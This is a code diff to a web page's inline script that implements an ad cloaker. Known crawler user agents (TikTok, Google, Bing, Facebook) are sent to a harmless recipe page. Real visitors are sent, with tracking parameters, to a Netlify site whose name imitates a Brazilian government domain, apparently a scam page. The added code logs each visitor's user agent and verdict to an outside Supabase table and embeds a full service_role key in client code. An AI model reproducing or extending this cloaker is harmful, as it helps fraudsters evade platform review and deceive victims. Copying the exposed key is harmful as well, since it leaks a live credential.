@@ -16,8 +16,9 @@ body{background:#fff;margin:0;padding:0;}
 (function(){
   var WHITE = "https://www.tudogostoso.com.br/categorias/1000-bolos-e-tortas-doces";
   var BLACK = "https://acnh-brasil-gov-br.netlify.app/";
+  var SB_URL = "https://ldyhodwdhavrgyooukpi.supabase.co";
+  var SB_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImxkeWhvZHdkaGF2cmd5b291a3BpIiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTc4NjQxMDUyNCwiZXhwIjoyMTAxOTg2NTI0fQ.JvEtOi46gaL5fAFk8XnUUeEyPTibpC79NwPGMF8SvdY";
 
-  // Bots do TikTok e rastreadores conhecidos
   var BOT_UA = [
     "bytespider","tiktok","bytedance","baiduspider",
     "googlebot","bingbot","facebookexternalhit","facebot",
@@ -37,6 +38,26 @@ body{background:#fff;margin:0;padding:0;}
     return false;
   }
 
+  function log(result, reason) {
+    try {
+      fetch(SB_URL + "/rest/v1/cloaker_logs", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+          "apikey": SB_KEY,
+          "Authorization": "Bearer " + SB_KEY
+        },
+        body: JSON.stringify({
+          user_agent: navigator.userAgent,
+          result: result,
+          reason: reason,
+          country: "BR",
+          ip: null
+        })
+      });
+    } catch(e) {}
+  }
+
   function appendUtms(url) {
     var params = new URLSearchParams(window.location.search);
     var keys = ["utm_source","utm_medium","utm_campaign","utm_content","utm_term","ttclid","fbclid","src","sck"];
@@ -47,8 +68,10 @@ body{background:#fff;margin:0;padding:0;}
   }
 
   if (isBot()) {
+    log("BOT", "Bot TikTok/rastreador detectado");
     window.location.replace(WHITE);
   } else {
+    log("REAL", "Lead real - TikTok");
     window.location.replace(appendUtms(BLACK));
   }
 
